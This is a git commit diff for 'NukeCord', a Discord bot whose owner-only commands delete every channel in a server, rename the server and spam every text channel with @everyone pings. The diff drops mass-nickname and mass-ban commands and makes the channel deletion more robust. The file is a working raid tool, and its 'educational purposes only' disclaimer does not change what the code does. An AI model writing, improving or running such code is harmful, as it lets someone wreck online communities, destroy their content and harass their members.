0988fb2b948dc4035e21224b2bfec601072264cd
evo <84800113+evo0616lution@users.noreply.github.com>
2022-01-27 21:59:10 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,4 @@
+print("[!] Don't forget to fill out the information in config.json")
 print("[~] Do nc!duck to get all commands")
 import discord 
 from discord.ext import commands
@@ -8,8 +9,8 @@ f = open("config.json", "r")
 x = f.read()
 y = json.loads(x)
 TOKEN = y["token"]
-OMG = y["your_id"]
-ID = int(OMG)
+O = y["your_id"]
+ID = int(O)
 
 
 @bot.event 
@@ -20,7 +21,7 @@ async def on_ready():
 @bot.command()
 async def duck(ctx):
     if ctx.author.id == ID:
-        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__List of commands:__\n```\nnc!nuke <text> | Nukes the current server and using the provided text\nnc!spam <text> | Spams a text in every channel including ping\nnc!nicknames <name> | Changes the nickname of everyone\nnc!ban | Bans all members\n```", color=0x36393e)
+        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!spam <text>\n```", color=0x36393e)
         embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
         await ctx.send(embed=embed)
 
@@ -32,7 +33,10 @@ async def duck(ctx):
 async def nuke(ctx, *, arg):
     if ctx.author.id == ID:
         for channel in ctx.guild.channels:
-            await channel.delete()
+            try:
+                await channel.delete()
+            except:
+                print(f"""[!] Could not delete channel "{channel.name}" """)
         await ctx.guild.edit(name=arg)
         x = 100
         while x >= 0:
@@ -43,25 +47,12 @@ async def nuke(ctx, *, arg):
 @commands.guild_only()
 async def spam(ctx, *, arg):
     if ctx.author.id == ID:
-        i = 100
-        while i >= 0:
-            for channel in ctx.guild.channels:
+        for channel in ctx.guild.channels:
+            if type(channel) != discord.channel.TextChannel:
+                print("\n")
+            else:
                 await channel.send(f"{arg} @everyone")
-            i = int(i) -1
             
-@bot.command()
-@commands.guild_only()
-async def nicknames(ctx, *, arg) :
-    if ctx.author.id == ID:
-        for member in ctx.guild.members:
-            await member.edit(nick=arg)
-
-@bot.command()
-@commands.guild_only()
-async def ban(ctx):
-    if ctx.author.id == ID:
-        for member in ctx.guild.members:
-            await member.ban(reason=None)
 
 
 bot.run(TOKEN)
